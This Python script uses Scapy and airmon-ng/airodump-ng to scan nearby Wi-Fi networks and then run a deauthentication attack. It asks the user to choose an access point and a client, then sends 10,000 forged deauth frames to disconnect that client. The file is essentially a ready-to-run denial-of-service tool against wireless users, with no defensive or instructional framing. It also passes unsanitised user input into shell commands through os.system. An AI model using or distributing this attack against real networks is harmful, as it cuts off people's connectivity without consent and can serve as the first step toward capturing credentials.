from scapy.all import *
from threading import Thread
import pandas
import time
import os
import signal
import sys

IFACE_NAME = "Qualcomm QCA9377 802.11ac Wireless Adapter"
devices = set()
ch =0
networks = pandas.DataFrame(columns=["BSSID", "SSID", "Channel"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

def PacketHandler(pkt):
    # if pkt.haslayer(Dot11):
    #     dot11_layer = pkt.getlayer(Dot11)
    #     temp = dot11_layer
    #     if dot11_layer.addr2 and (dot11_layer.addr2 not in devices):
    #         devices.add(dot11_layer.addr2)
    #         print(dot11_layer.addr2, temp.info)
    global ch
    ch = (ch % 14 ) +1
    x= "sudo iwconfig wlan0mon channel " + str(ch)
    os.system(x)
    # switch channel from 1 to 14 each 0.5s

    if pkt.haslayer(Dot11Beacon):

        bssid = pkt[Dot11].addr2
        ssid = pkt[Dot11Elt].info.decode()
        stats = pkt[Dot11Beacon].network_stats()
        channel = stats.get("channel")
        networks.loc[bssid] = (ssid, channel)


os.system("iwconfig")
INTERFACE = input("please enter your network interface name:\n")
os.system(f"sudo airmon-ng start {INTERFACE}")
os.system("sudo ifconfig wlan0mon up")
print("networks scan in progress , please wait...")
sniff(iface="wlan0mon", count=300, prn=PacketHandler)

print(networks)
print("if the network list is empty , please run the program again")
print("|-------------------------------------------|")
AP = input("please choose network BSSID and write it :\n"
           "network: ")
channel = input("\nplease enter the channel of the network that you choose :\n"
                "channel: ")
print()
print("|-------------------------------------------|")
input("in the next step we will execute client's scan ,to stop the clients scan press \n"
      "ctrl+c \n"
      "|-------------------------------------------|\n"
      "press enter to confirm ")
# avi=os.system("gnome-terminal airodump-ng --channel {channel} --bssid {AP} wlan0mon")
avi = os.system(f"airodump-ng --channel {channel} --bssid {AP} wlan0mon")
target = input("choose a Client that you would like to disconnect:\n"
               "client: ")

print("\n------------ Attack starting ------------")
# AP = input("\nchoose network from the above\n")
# print(AP)

brdmac = "ff:ff:ff:ff:ff:ff"
print("target -- AP")
pkt = RadioTap()/ Dot11( addr1 = brdmac , addr2 = target ,addr3= AP ) / Dot11Deauth()

sendp(pkt , iface = "wlan0mon" , count = 10000 , inter = .2)